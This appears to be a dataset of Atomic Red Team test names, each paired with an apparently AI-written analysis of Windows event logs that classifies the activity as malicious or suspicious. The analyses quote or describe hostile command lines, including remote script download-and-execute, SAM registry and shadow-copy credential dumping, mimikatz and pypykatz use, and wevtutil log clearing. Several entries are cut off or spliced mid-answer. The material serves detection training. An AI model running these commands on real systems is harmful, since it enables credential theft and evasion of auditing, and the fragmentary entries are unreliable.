   - **System Log (EventID 104)** and **Security Log (EventID 1102)** entries indicate that log files have been cleared by the user `admin_test`. Clearing of logs, especially by an administrative account, is considered suspicious as it might be an attempt to cover tracks after malicious activities.

2. **Suspicious PowerShell Activity**:
   - The PowerShell logs show execution of a script that performs a password spraying attack. The command line shows a loop that attempts to bind using NTLM with a default password `'P@ssw0rd!'` across user accounts, which is a clear misuse of PowerShell for unauthorized access attempts.

3. **Process Execution Logs (Sysmon Logs)**:
   - Execution of `wevtutil.exe` tool for clearing logs is often associated with malicious actions aiming to hide activities. This tool was used multiple times to clear different log channels which corroborates attempted cover-up activities.
   - There is the execution of `whoami.exe` and `hostname.exe` in quick succession. While innocuous by themselves, in conjunction with the other suspicious activities, they can be used by an attacker to gather system information.

These activities exhibit clear tactics of attempting to gain unauthorized access (password spraying), followed by attempts to cover tracks (log clearing) — both of which are indicative of malicious intent.

**Assessment and Resolution**:
- **Situation**: The logs show activities consistent with a system compromise attempt, involving password spraying and log clearing to obfuscate actions.
- **Threats/Risks Identified**: 
  - Unauthorized access attempts using PowerShell.
  - Possible exfiltration or alteration of sensitive data after access is gained.
  - Data integrity and security could be compromised.
- **Guidance**: 
  - Immediately isolate the affected host for further forensic analysis.
  - Audit the `admin_test` account for any unauthorized accesses or changes.
  - Change credentials for all accounts that might be affected.
  - Strengthen audit policies to prevent log clearing and to detect such events earlier.
  - Ensure PowerShell logging is configured to capture detailed command-line activities.
  - Review firewall and network logs for any anomalies.

Given the activities observed, I am confident in classifying this situation as **MALICIOUS**. Steps should be taken immediately to contain and remediate the threat."
dump volume shadow copy hives with certutil,"Upon reviewing the provided Windows event logs, several indicators point towards suspicious activity:

1. **Log Clearing**: 
   - In the System Log, event ID 104 shows that the logs for both the ""System"" and ""Windows PowerShell"" channels have been cleared by a user named ""admin_test"". Such actions are often taken to cover up malicious activity and is highly uncommon during normal administrative tasks.

2. **Security Log Clearing**:
   - In the Security Log, event ID 1102 marks the clearing of security logs by the same user, ""admin_test"". This is a critical red flag as it indicates potential tampering with security records.

3. **Sysmon Log Events**:
   - Multiple execution logs of `wevtutil.exe`, which is used for event log manipulation, suggest an attempt to clear specific channels' logs (System, Security, and Windows PowerShell). The frequent use of this utility further emphasizes the effort to hide traces of specific activities.
   
4. **Process Execution**:
   - The Sysmon logs reveal execution of `cmd.exe` with a command line involving `certutil` used to encode the Security Account Manager (SAM) database from Volume Shadow Copies. This is considered a highly suspicious activity, as attackers often use this method to extract credential data.
   - Several instances of `certutil.exe` in conjunction with these commands show attempts to access and possibly extract sensitive files, indicative of credential dumping attempts.

5. **CertUtil Usage**:
   - A series of `certutil` executions designed to process Volume Shadow Copies suggest an attempt to access the Windows SAM file. This is a well-documented technique used in attacks to capture and crack user credentials offline.

Based on these findings, the situation requires immediate attention. These logs suggest:
- An insider threat or a compromised account (""admin_test"") executing activities typically associated with malicious actors.
- Attempts to extract sensitive credential information from the system.
- Clear efforts to cover tracks by deleting log entries for critical system operations.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
1. Immediately isolate the host (Server002) from the network to prevent further compromise.
2. Investigate the account ""admin_test"" for unauthorized usage, including examining any recent access patterns or changes.
3. Conduct a full forensic analysis on Server002 to understand the scope and impact of the activity.
4. Reset credentials and assess affected systems for unauthorized access.
5. Strengthen log monitoring and alerting mechanisms for future instances of log clearing or suspicious process executions.
6. Review and update internal policies to restrict and log the use of utilities like `wevtutil` and `certutil` to authorized personnel only."
Dump Credential Manager using keymgr.dll and rundll32.exe,"**Detailed Analysis of Logs:**

**1. Context and Log Summary:**

The logs span a range of event sources including System, Security, Sysmon, Windows PowerShell, and Application logs from a system identified as Server002. 

**Suspicious or Anomalous Behavior:**

- **Log Clearing Activity:**
  - **System Logs (EventID 104)**: The logs show that someone cleared multiple event logs using the `wevtutil` command. This command was run by the user `admin_test` which indicates logs were cleared from the System, Windows PowerShell channel, and Security log.
  - **Security Logs (EventID 1102)**: The clearing of the Security log is a serious indication of potential malicious activity as it might be an attempt to hide tracks after unauthorized actions.
 
- **Privilege Escalation and User Activities:**
  - **Security Logs (EventID 4672 and 4624):** `admin_test` was assigned a logon session with multiple privileges including `SeDebugPrivilege`, which can be exploited for privilege escalation. The logon type is remote (Type 3), suggesting this action was performed over the network.
  
- **Command Execution Patterns:**
  - **Sysmon Logs (EventID 1):** Multiple instances of the `wevtutil.exe` utility were executed to clear specific logs (e.g., ""cl Security"", ""cl System"", ""cl Application"").
  - **PowerShell Logs:** The PowerShell command executed with `rundll32.exe keymgr,KRShowKeyMgr` is suspicious as it can indicate an attempt to manage credentials potentially, although it could be legitimate depending on the host's role.

**Indications of Malicious Activity or Compromise:**

- The clearing of logs is a red flag in security investigations—especially when it involves clearing Security logs on a critical system or server as a means of covering tracks potentially following a compromise or unauthorized changes.
- The unusual usage of PowerShell commands and creation of processes such as `rundll32` further supports the theory of attempts to bypass conventional security monitoring mechanisms.

**Threat/Risk Assessment:**

- There is a clear attempt to cover tracks by clearing logs.
- The elevated privileges and their corresponding usage need to be scrutinized.
- The actions suggest there might have been a compromise, or at the very least, suspicious activities.

**Guidance on How to Proceed:**

1. **Immediate Measures:**
   - Verify the legitimacy of the `admin_test` account actions. Determine if the account was compromised or if a legitimate admin was performing these actions.
   - Conduct a detailed audit and review of other systems and accounts potentially affected by the same issue.

WinPwn - Loot local Credentials - mimi-kittenz,"The provided logs reveal several activities that are concerning and warrant further investigation.

### Analysis:

1. **Log Cleared Events:**
   - The Windows Event Log (Event ID 104) and Security Log (Event ID 1102) entries indicate that logs have been cleared by the user ""admin_test"". This activity can be indicative of a malicious actor attempting to cover their tracks, as clearing logs is a method to hide evidence of unauthorized access or malicious behavior.

2. **Unusual PowerShell Activity:**
   - The PowerShell logs and Sysmon logs together indicate that a PowerShell command was executed involving the download and execution of a script from ""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn"". The presence of a script named ""WinPwn.ps1"" is highly suspicious as such scripts are often associated with penetration testing tools or exploitation frameworks.
   - HostApplication field shows a command that not only downloads the script but also executes it with specific options, which implies potential unauthorized or malicious activity.

3. **Use of `wevtutil` Command:**
   - The Sysmon logs show multiple executions of ""wevtutil.exe"" with the command lines indicating attempts to clear event logs (e.g., ""cl Microsoft-Windows-Sysmon/Operational""). This aligns with the Event Log Cleared events and supports the evidence of log tampering possibly attempting to hide activity.

4. **Execution of Common Discovery and Utility Tools:**
   - The execution of system binaries like `hostname.exe`, `whoami.exe`, and the execution of potentially benign processes (like `conhost.exe` associated with console settings) is noted. While this can be legitimate, when executed together after suspicious activity, they can often indicate discovery or reconnaissance actions as part of an attack chain.

### Assessment:

The combination of cleared event logs, the use of PowerShell to download and execute potentially malicious scripts, and the execution of utilities that can facilitate further compromise or reconnaissance signifies malicious intent.

Symptoms of common tactics, techniques, and procedures (TTPs) associated with post-compromise activities are evident, such as:
- **Execution of unauthorized scripts**
- **Log tampering**
- **Reconnaissance**

Simulating access to Windows Edge Login Data,"Upon thorough analysis of the provided Windows event logs, the following observations and assessments are made:

1. **Windows PowerShell Log:**
   - The PowerShell logs reveal the execution of a PowerShell command with the `Copy-Item` operation. The command is designed to copy the Edge browser's user data from a local environment path to a temporary directory associated with ""AtomicRedTeam"". The use of ""AtomicRedTeam"" suggests this activity may be associated with a security testing framework often used for red team exercises or security evaluations. The command includes paths with ""..\\"", which could be indicative of an attempt to traverse directories, raising suspicion of potential misuse or testing purposes.

2. **System Log:**
   - The log highlights that the event logs for System and Windows PowerShell were cleared by a user identified as ""admin_test"". Clearing logs is a common tactic used to cover illicit activities, making this action suspicious.

3. **Security Log:**
   - This log also confirms that the Security event log was cleared by ""admin_test"". This further solidifies the suspicion of activities attempting to cover tracks.

4. **Sysmon Log:**
   - The Sysmon logs show frequent execution of system utilities (`wevtutil`, `conhost.exe`, `whoami.exe`) and applications (`powershell.exe`). The PowerShell activity mirrors that in the Windows PowerShell log, confirming its execution. Moreover, frequent clearing of logs (`wevtutil.exe` utilized for clearing logs such as `Security`, `System`, and `Windows PowerShell`) by the same user is highly suspicious.

5. **Application Log:**
   - Logs related to routine activities of Microsoft Edge Update and Software Protection Platform Service appear benign.

6. **Analysis and Conclusion:**
   - The clearing of logs (System, Security, and Windows PowerShell) by a user with elevated privileges, combined with PowerShell commands executed with suspicious paths related to Edge browser data copying (possibly related to security testing), suggest potential misuse.
   - The combination of these actions aligns with tactics often employed during red team exercises or by malicious actors to exfiltrate data or audit trails in a controlled manner for testing purposes or with malicious intent.

Based on these findings, the resolution for the logs is determined to be **SUSPICIOUS**. The activity appears suspiciously aligned with actions that could be part of security testing, but the lack of explicit confirmation of benign testing purposes necessitates further investigation. Immediate actions should include:
- Confirmation with relevant departments or responsible teams regarding any authorized security tests.
- Oversight on the user account ""admin_test"" for unusual or unauthorized activities.
- Review and tighten access controls to prevent unauthorized log clearance.
- Continuous monitoring to ensure such activities are sanctioned and within expected operational parameters."

Decrypt Mozilla Passwords with Firepwd.py,"Upon reviewing the provided logs, here's the detailed analysis:

### Suspicious or Anomalous Behavior:
1. **PowerShell Activity:** The logs show that PowerShell is being used to execute a script targeting the Mozilla Firefox profile data directory:
   - A Python script named `Firepwd.py` seems to be executed to extract password data from Firefox profiles. This involves:
     - Accessing paths typical of Firefox profile directories.
     - Redirecting the output to a temporary text file for potentially exfiltrating credentials (`T1555.003Test8.txt`).
   - This is indicative of credential theft attempts, conforming with MITRE ATT&CK Technique T1555.003 (Credentials from Web Browsers).

2. **Log Cleaning Events:**
   - Several logs (System, PowerShell, and Security) have been cleared by the `admin_test` user, which is highly suspicious:
     - `wevtutil.exe` command appears multiple times with the clear (`cl`) command for various channels.
     - Log clearance can be an indication of an attempt to cover malicious activities.

3. **Sysmon Activity:**
   - The frequent creation of `wevtutil.exe` and `conhost.exe` processes in a relatively short period indicates the manipulation and possible clearing of event logs.
   - High integrity levels of these processes suggest the commands were executed with elevated privileges.

### Indicators of Malicious Activity or Compromise:

5. **Review Alerts & Monitoring:** Increase monitoring and alerting on similar suspicious activities across the network, especially focusing on PowerShell usage and log manipulation.

These actions should help in addressing the immediate threat and strengthening the overall system security posture."
"Dumping of SAM, creds, and secrets(Reg Export)","Based on the analysis of the provided logs, several suspicious activities stand out that suggest malicious behavior:

1. **Log Clearing Events**: 
   - **Sysmon and System Logs**: There are events indicating the clearing of event logs. In the System log, EventID 104 corresponds to log clearing for `System` and `Windows PowerShell` channels. In the Security log, EventID 1102 indicates log clearing as well. The user associated with this operation is `admin_test`, who cleared logs across these channels within a very short timeframe. Log clearing can often be an indicator of an attempt to cover malicious activity.

2. **Suspicious Command Execution**:
   - **Command Execution via `cmd.exe`**: There is an execution of `cmd.exe` with a command line to export registry hives: `HKLM\sam`, `HKLM\system`, and `HKLM\security` to the temporary directory. Exporting these hives can be an attempt to extract sensitive information, such as hashed credentials, which is a common tactic used by attackers for offline password cracking attempts.

3. **Unexpected Process Execution**:
   - **Wevtutil Processes**: Multiple executions of `wevtutil.exe` with the `cl` (clear) command for event logs suggest an intentional attempt to cover up traces by clearing logs in multiple channels, as corroborated by the log clearing events in the System log.

4. **System Integrity**:
   - The use of utility software like `whoami.exe`, `wevtutil.exe`, and `reg.exe` is normal in certain contexts. However, combined with the suspicion of log clearing and registry hive exports, these seem to be part of a coordinated attempt to assess and modify system state in a potentially malicious manner.

5. **Time Manipulation**:
   - **Time Manipulation Events**: There are events in the Security logs (EventID 4616) pointing out changes in system time. Time changes can be an indicator of an attempt to disrupt log integrity or align event timelines in a way that makes detection more difficult or misleads incident response efforts.

Given these observations:

- **Overall Situation Assessment**: The combination of log clearing, registry hive export, and the timing and sequence of commands suggest a deliberate sequence of actions aimed at reconnaissance and covering tracks post-compromise.

- **Threats and Risks Identified**: 
  - Potential extraction of sensitive credential data from registry hives.
  - Obfuscation attempts via log clearing, which might prevent detection of prior or concurrent malicious activity.
  - Possible lateral movement or further exploitation poised by acquired credentials.

- **Guidance on How to Proceed**:
  - Immediate containment and investigation are recommended. 
  - Isolate the affected server for forensic analysis to prevent further data loss or compromise.
  - Review and enhance log retention and monitoring policies to prevent future log clearing.
  - Examine other endpoints for similar activities indicating broader compromise.

Registry parse with pypykatz,"Upon reviewing the provided logs, the following observations can be made:

1. **Installation of Python 3.10.4**:
   - The application logs show the installation of Python 3.10.4 along with its components such as pip and updates to PATH variables. This activity itself appears benign as Python installations are common on systems for development or scripting purposes.

2. **Sysmon Logs Analysis**:
   - **Processes**:
     - Multiple instances of `python.exe` and `wevtutil.exe` are observed. While Python processes are common, the instances of `wevtutil.exe` clearing logs (like Sysmon, Application, Security) are concerning as clearing event logs can be an attempt to cover tracks.
   - **Suspicious Command Execution**:
     - The command involving `pypykatz` (`cmd.exe /c ""pypykatz live lsa""`) is notably suspicious. `pypykatz` is a well-known tool used for mimicking the actions of `mimikatz`, a utility used to extract plaintext passwords, hash, PIN code, and kerberos tickets from memory. This is indicative of an attempt to perform credential extraction.
   - **Unusual Processes from Temp Directory**:
     - The execution of `python_setup.exe` from a Temp directory via a PowerShell script further raises suspicion. This script involves downloading Python from an external source, which hints towards potential unauthorized software installation.

3. **PowerShell Logs**:
   - **Script Usage**:
     - The PowerShell log indicates script activities that precede the download and execution of an installer from `python.org`, raising concerns about potentially unwanted installations facilitated by scripts.

4. **Security Logs**:
   - **Log Clearing Activity**:
     - A significant red flag is the `EventID 1102` indicating that the Security event logs were cleared by the `admin_test` user. This action can be a method to hide malicious activity traces.

5. **System Logs**:
   - **Log File Cleared**:
     - Similar log clearance is observed here, suggesting a deliberate effort to hide the footprint of either authorized or unauthorized activities on the system.

**Assessment and Recommendation:**

- **Assessment**: The presence of the `pypykatz` command and the clearing of event logs point to potentially malicious activity. This behavior, combined with well-known indicators of credential dumping, suggests that the system may have been compromised, or at least subject to unauthorized and potentially harmful activity.

- **Recommendation**: It is crucial to further investigate the actions of the `admin_test` user, who has cleared the logs. Additionally, immediate steps should be taken to secure the system, including resetting passwords for accounts that might have been accessed, conducting a thorough system scan for malware, and reviewing access to external sites and sources that might have been involved in downloads/installations.

- **Resolution: MALICIOUS**: Based on the evidence from the logs, especially the usage of `pypykatz` and log clearance activities, the events constitute a clear indication of malicious activity."
Create Volume Shadow Copy with diskshadow,"Upon reviewing the provided event logs, there are several areas that deserve attention due to potential indicators of malicious activity:

1. **Clearing of Event Logs**: 
    - **Security EventID 1102 and System EventID 104**: These logs indicate that the event logs have been cleared. Specifically, the Security log was cleared by the user `admin_test` around `2024-10-20 20:32:13`. The intentional clearing of event logs is often an indicator of an attempt to cover tracks following unauthorized or malicious activities.

2. **Privilege Escalation**:
   - **Security EventID 4672**: The user `admin_test` was granted special privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are sensitive permissions that can be exploited for malicious activities like unauthorized data access or privilege escalation.

3. **Unusual Command Execution**:
   - In the Sysmon logs, several instances of `wevtutil.exe` were seen. It was executed multiple times by `admin_test` to clear event logs based on its command line arguments, such as `\""C:\\Windows\\system32\\wevtutil.exe\"" cl Security`.

4. **Activity Mimicking Malicious Techniques**:
   - A suspicious command was found: `\""cmd.exe\"" /c mkdir c:\\exfil & diskshadow.exe /s C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1003.003\\src\\diskshadow.txt\""`. The creation of a directory named `exfil` and usage of `diskshadow` suggests potential data exfiltration or shadow copy exploits, often seen in malicious activities.

5. **NTLM Authentication**:
   - **Security EventID 4624** indicates a log-on attempt using NTLM from a workstation named `DESKTOP-3HL5B2P` with an IP of `192.168.0.102` that might be worth scrutinizing for context and legitimacy.

6. **Multiple Credential Access Failures**:
   - There are multiple EventID 5379 logs attempting to access what appears to be either Microsoft Account credentials or Windows Live tokens with consistent failure return codes. These repeated unsuccessful attempts point towards unauthorized access attempts or misconfiguration.

Given these findings, the logs reveal a pattern of suspicious behavior, particularly around the clearing of logs and command executions that align with potential malicious activities and attempts to cover tracks. This warrants further in-depth investigation to determine the full extent of the breach and any resulting impacts.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed**:
1. Conduct a full security audit to determine the scope of potential unauthorized access.
2. Isolate affected machines for forensic analysis.
3. Restore cleared logs from backup if possible, to gather more information regarding actions preceding the log clearing.

5. Implement enhanced monitoring and logging to prevent further unauthorized activities.
6. Consider running antivirus tools and integrity checks on systems to locate and remove any potential malware."
ESXi - Brute Force Until Account Lockout,"The Windows event logs provided contain multiple indications of suspicious activities that warrant closer inspection. Below is a detailed analysis of the pertinent log entries:

### Suspicious Activities Observed:
1. **PowerShell Usage for Potential Malicious Activity:**
   - A PowerShell script is executing plink.exe, an SSH tool, several times in quick succession. The command line used is attempting SSH connections to a host titled ""atomic.local"" using the root user and a provided password. The execution in a loop suggests an automated attempt to either brute-force or establish persistent connections.
   - This activity originated from a PowerShell script within the user context `SERVER002\admin_test`, and the script path suggests the use of Atomic Red Team, a known toolset for simulating adversary behavior for security testing. This could hint at either security testing or unauthorized use.

2. **Event Log Tampering:**
   - Event logs for the System, Windows PowerShell, and Security channels have been cleared (`EventID 104` in System and `EventID 1102` in Security logs). This is a known tactic used by attackers to cover their tracks after initiating potentially malicious activities.

3. **Use of Admin Privileges:**
   - The user `admin_test` has high integrity level privileges, as observed in multiple logs, indicating that they have admin-level capabilities on the server. 

### Assessment:
- **The PowerShell Command:**
  - The command seen in the logs attempts to execute SSH commands using `plink.exe`, suggesting either penetration testing or malicious activity. The repetitive execution of such a script without clear documentation or legitimate testing purposes is suspicious.
  
- **Log Clearance Events:**
  - The log clearance events shortly follow the execution of PowerShell commands, which is a typical behavior if the intent is to hide traces of any scripted attack or reconnaissance activity.

### Recommendations:
- **Immediate Validation:**
  - Verify the legitimacy of the PowerShell script by checking with the user responsible or IT administrators for documentation or approval of any penetration tests.
  
- **Containment:**
  - Isolate the compromised system (Server002) from the network to prevent further unauthorized access or data exfiltration.
  
- **Forensic Analysis:**
  - Conduct a comprehensive forensic investigation on Server002, focusing on executed scripts and command lines, installed tools like `plink.exe`, and any new or altered accounts/processes.
  
- **Review Privileges:**
  - Audit and review administrative privileges, and ensure all such accesses have justifications and monitoring in place.

### Final Resolution: SUSPICIOUS
The activity described above requires further investigation to confirm whether it is legitimate penetration testing or unauthorized malicious activity. The organization should treat this situation with heightened caution to prevent potential data breaches or system compromises."
WinPwn - powershellsensitive,"Upon analyzing the provided Windows event logs from various categories (Application, System, Security, PowerShell, and Sysmon), the following observations were made:

### Application Log:
- The logs show normal application-level events such as Windows Defender being active, and software protection platform service running. No anomalies noted.

### System Log:
- Multiple events involved clearing of event logs, particularly in critical channels like System and Windows PowerShell, conducted by a user account ""admin_test"". This can signify an attempt to cover tracks since clearing logs is a common tactic post-compromise.
- Time adjustments are seen in the logs but seem to be regular time synchronization with NTP servers, no direct indicators of tampering or manipulation.

### Security Log:
- Security event logs were also cleared by ""admin_test"", which is highly suspicious, as tampering with security logs is indicative of malicious activity or covering malicious actions.

### Windows PowerShell Log:
- PowerShell logs indicate the execution of a script pulled from a potentially malicious GitHub repository (https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn) which is flagged as suspicious. The use of `iex(new-object net.webclient).downloadstring(...)` is a common technique for executing scripts from remote locations directly in memory, often found in attack tactics.

### Sysmon Log:
- Events reveal that the user ""admin_test"" executed the `wevtutil.exe` command to clear logs in the security, system, and PowerShell channels, confirming efforts to remove traces of activity.
- Presence of script execution via PowerShell with suspicious command lines indicating potential use of offensive PowerShell scripts.

### Overall Assessment:
The presence of log clearing events, PowerShell execution fetching scripts from potentially malicious sources, and the specific techniques used suggest that the system was likely compromised. These activities fall well into known tactics used by attackers to escalate privileges, perform reconnaissance, or execute further attacks while making it difficult to audit and track their activities.

### Resolution: MALICIOUS
Based on the analysis above, there are clear indicators of compromise, especially the deliberate clearing of multiple logs by the admin_test user and the execution of potentially malicious PowerShell scripts. Immediate actions should be taken to secure this system.

### Recommendations:
1. Initiate an Incident Response process to further investigate the system and network for any other signs of compromise.
2. Isolate the affected host to prevent further spread or damage within the network.

#### Key Indicators of Malicious Activity:

1. **Execution of Mimikatz**:
   - **Sysmon Log Event RecordID 17935**: The command `""C:\Windows\system32\cmd.exe"" /c echo %%tmp%%\mimikatz\x64\mimikatz.exe` is highly suspicious. Mimikatz is a known tool used for extracting passwords and other sensitive information from the Windows memory. Its presence in the command line arguments is a strong indicator of malicious intent.

2. **Clearing of Event Logs**:
   - **Security Log EventID 1102**: Multiple logs (Security, Sysmon, and ""Windows PowerShell"") are cleared by the user `SERVER002\admin_test`, which is suspicious behavior, often associated with attackers trying to cover their tracks.

3. **Use of Wevtutil**:
   - **Sysmon Log Record 17939**: `wevtutil.exe` is used to clear events from the ""Microsoft-Windows-Sysmon/Operational"" log, which aligns with attempts to erase evidence.

4. **High Integrity Level and Use of Command-Line Tools**:
   - Many of the processes run with high integrity levels and involve command-line utilities such as `wevtutil.exe`, `cmd.exe`, and `powershell.exe`. These tools are commonly used in various administrative tasks but are also employed by attackers for post-exploitation actions.

5. **Suspicious Process Executions**:
   - Several processes like `whoami.exe` are executed by the user `SERVER002\admin_test`, and while not inherently malicious, could be part of a larger script of recon activities.

6. **Security Log -- Unauthorized Credential Access Attempt**:
   - **Security Log EventID 5379**: Multiple failed credential access attempts utilizing `WindowsLive` or `MicrosoftAccount`, with information about a `ReturnCode` showing unsuccessful reads.

7. **Unusual Timing and Volume of Events**:
   - The volume and frequency of events occurring within a very short window (around `2024-10-20 20:46:23 to 2024-10-20 20:46:25`) is atypical for normal system behavior and suggests scripted or automated activity.

### Assessment and Conclusion

These logs exhibit several indicators of potential malicious activity:

- **Use of Mimikatz** to gain credential information.
- **Clearing of logs** to cover tracks.
- **Use of wevtutil** to manipulate event logs.
- **Unauthorized attempts** to access credential information without success.

Given these observations:

**Resolution: MALICIOUS**

6. **Employee Training**: Conduct training sessions to make users aware of security policies and the importance of not using privileged accounts indiscriminately."
WebBrowserPassView - Credentials from Browser,"Based on the analysis of the Windows event logs provided, several indicators suggest malicious activity:

1. **Clearing of Event Logs**:
   - Security Event log (EventID 1102) and Sysmon Operational log entries show that the logs were cleared by the user `admin_test` on `Server002`. Clearing event logs is a known tactic used by attackers to hide their tracks, and this was done without corresponding legitimate administrative activity.

2. **Suspicious Use of `wevtutil`**:
   - We see the execution of `wevtutil.exe` commands to clear event logs in Sysmon logs (command `cl Microsoft-Windows-Sysmon/Operational` and `cl Application` and `cl Security`). This command sequence implies an attempt to cover actions performed.

3. **Execution of WebBrowserPassView**:
   - The Sysmon logs indicate the execution of `WebBrowserPassView.exe`, which is a tool known for extracting stored web browser passwords. This was executed using `PowerShell` (as seen in Sysmon and PowerShell logs) by the user `admin_test`, indicating an attempt to harvest credentials potentially without user consent. The command-line used via PowerShell (`""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1555.003\\bin\\WebBrowserPassView.exe""`) further corroborates this.

4. **Command-Line Execution via PowerShell**:
   - The use of PowerShell to run the `WebBrowserPassView.exe` is seen in both Sysmon and Windows PowerShell event logs. PowerShell is a common tool used in advanced attacks to execute commands and scripts due to its powerful capabilities and ease of obfuscation.

5. **Privilege Escalation Indicators**:
   - Events related to high privileges, like SeDebugPrivilege, indicate potential misuse by the user `admin_test`, showing attempts to conduct actions requiring elevated permissions.

6. **Unknown External Identifiers**:
   - `TargetName` fields such as `MicrosoftAccount:user=02txoixylodcstop` in Event ID 5379, suggesting attempts to potentially interact or authenticate with external credentials or resources.

Based on these findings, the resolution is:

- **MALICIOUS**: The logs provide multiple indicators of potentially malicious activity, including the clearing of logs, the use of a password extraction tool, suspicious command execution via PowerShell, and indicators of privilege escalation.

**Guidance on How to Proceed**:
- Immediately isolate `Server002` from the network to prevent any further malicious activity.
- Conduct a comprehensive forensic investigation to identify the full extent of the breach.
- Review security policies and ensure that logging is enabled and monitored for unusual activities.
- Audit user accounts, especially the `admin_test` user, for unauthorized access or configuration changes.
- Implement measures to better detect and alert on suspicious use of administrative tools such as PowerShell and `wevtutil`.
- Change passwords and reset credentials for any potentially compromised accounts."
Password Spray Microsoft Online Accounts with MSOLSpray (Azure-O365),"Based on an in-depth analysis of the provided Windows event logs, several indicators suggest potential malicious activity. Here are the findings and analysis:

1. **Suspicious PowerShell Activity**:
   - There are multiple entries in both the PowerShell and Sysmon logs indicating the execution of a PowerShell script located in a temporary directory. This script is `MSOLSpray.ps1`, and it is invoked with parameters resembling a password spraying attack (`Invoke-MSOLSpray`). The execution of scripts from temporary locations and usage of specific password attack tools indicates suspicious behavior.

2. **Log File Clearing**:
   - Multiple logs indicate the clearing of event logs (Event ID 104 in the System log and Event ID 1102 in the Security log). These are initiated by the user `admin_test` using `wevtutil.exe`, a Windows command-line utility for managing event logs. Clearing logs can be a tactic to cover tracks, which is a common trait of malicious activity.

3. **Unusual Command Line Activity**:
   - The command-line activity involves the usage of `wevtutil.exe` to clear logs, along with the suspicious PowerShell activity. The presence of batch clearing of system, security, and PowerShell logs with specific command line usage pattern, in conjunction with other suspicious activities, exacerbates the suspicion.

4. **Windows Defender Status**:
   - Windows Defender is reported as active, but its effectiveness can be questioned given the suspicious activities. Active security products should ideally detect such behavior (but this might depend on updated threat intelligence and local security policies).

5. **Temporal Correlation**:
   - The timestamps across different logs are very close to each other, suggesting coordinated actions, possibly by an attacker.

Given these observations, the events significantly deviate from expected behavior and bear characteristics typical of malicious activities. Therefore, the events can be summarized as follows:

- **Assessment**:
  - **MALICIOUS**: The logs strongly indicate malicious activity due to the use of PowerShell for a potential attack operation (`MSOLSpray.ps1`), and the clearing of multiple log files likely aiming to conceal malicious actions.
  
- **Threats and Risks**:
  - Potential unauthorized access attempts or data breaches through password spraying.
  - Risk of undetected malicious activity due to log clearing.

- **Guidance on How to Proceed**:
  1. Immediately terminate any suspicious processes, especially future executions of PowerShell scripts originating from temporary locations.
  2. Conduct a thorough investigation to ascertain the extent of the compromise, focusing on communications and past accesses related to the identified activities.
  3. Enhance monitoring of log activities and specifically look for indicators of compromise tied to script-based attacks.
  4. Evaluate the logs and surrounding systems for further unauthorized access or persistence mechanisms set up by potential attackers.
  5. Consider isolating the affected host from the network to prevent further spread or data exfiltration.

These actions should help mitigate immediate threats and provide insights to reinforce network and host defenses."

2. **Time Manipulation**:
   - **Security Log Entry (EventID 4616)** and **System Log Entry (EventID 1)**: Time adjustments are seen within the logs. The system time was set back by `svchost.exe`, which can be a technique used to manipulate timestamps on log entries or other activities to obfuscate actions.

3. **PowerShell Activity**:
   - **PowerShell Log Entries**: The logs contain PowerShell command executions using `Invoke-Internalmonologue.ps1` from an external URL `https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1`. This script is known to execute security/penetration testing activities and can be used for malicious purposes, such as retrieving NTLM hashes.

4. **High Privileges**:
   - **Security Log Entry (EventID 4672)**: The `admin_test` user is granted a set of high-level privileges like `SeDebugPrivilege`, `SeBackupPrivilege`, and others that are potentially dangerous if misused or if the account is compromised.

5. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` execution with the command to clear event logs, reinforcing the suspicion that actions to cover tracks were taken.

6. **EdgeUpdate Anomalies**:
   - **Sysmon Log Entries**: While Edge updates themselves can be benign, the consistency and quantity suggest potential misuse or exploitation paths.

### Conclusion:
The combination of log clearing, time adjustments, execution of known attack scripts, granting of elevated privileges, and multiple EdgeUpdate executions facades suspicious behavior indicative of a compromise. These events are aligned with tactics often used by attackers post-compromise to maintain persistence, escalate privileges, and cover their tracks.

### Resolution:
Based on the activities described and the associated risks, I categorize this log analysis as **MALICIOUS**.

Request All Tickets via PowerShell,"Upon detailed analysis of the provided Windows event logs from various channels, several observations were made which indicate potentially suspicious behavior:

### Anomalies and Observations:

1. **Log Clearing Events:**
   - **System Log (Event IDs: 104) and Security Log (Event ID: 1102):**
     - There are events indicating the system and PowerShell logs have been cleared. The `admin_test` user performed these operations. This behavior is typically suspicious as it indicates possible attempts to hide previous activities.

2. **Use of `wevtutil.exe`:**
   - The `wevtutil.exe` utility is used multiple times to clear event logs for different log channels such as System, Windows PowerShell, and Application. The frequent invocation of this utility by the user `admin_test` under high integrity level doesn't align with typical administrative maintenance and suggests log tampering.

3. **Suspicious PowerShell Activity:**
   - A PowerShell script is executed that involves adding types from `System.IdentityModel` and querying SPNs (Service Principal Names) using `setspn.exe`. The command line shows usage of potentially complex PowerShell commands that could be used in reconnaissance or credential-related attacks.

4. **Execution of `whoami.exe` and `hostname.exe`:**
   - These commands were executed potentially to gather system information, a typical behavior seen during the reconnaissance phase of a cyber-attack lifecycle.

5. **EdgeUpdate Service Activity:**
   - While `MicrosoftEdgeUpdate.exe` and related activities are seen frequently, the combination of log clearing and PowerShell activity suggest these might be innocuous at first glance, and are typical of regular update processes, but when considered with the log tampering, it seems to divert attention.

### Assessment and Conclusion:

Based on the logs:
- The actions of clearing logs, especially security and system event logs, are key indicators of an attempt to cover tracks after potentially conducting malicious activities.
- The PowerShell activity involving complex commands and the context in which it is executed could be indicative of reconnaissance or preparation phase of a cyber-attack.
- While processes like `MicrosoftEdgeUpdate.exe` are usually benign and related to updates, the context of execution here, intermixed with inappropriate log management and potential reconnaissance commands is cause for concern.

### Resolution:
- **SUSPICIOUS**: The activities observed are suspicious, with indications of potential attempts to hide evidence and execute unusual scripts, warranting further detailed investigation. Immediate steps should include:
  - Conducting a deeper forensic analysis on the `admin_test` account to check for unauthorized access or misuse.
  - Reviewing and strengthening access controls and monitoring PowerShell script executions.
  - Checking for any indicators of compromise such as any unauthorized software installation or network communication."
Dump svchost.exe to gather RDP credentials,"Upon analyzing the provided Windows event logs, several indicators of suspicious and potentially malicious activity have been identified:

1. **PowerShell Activity**:
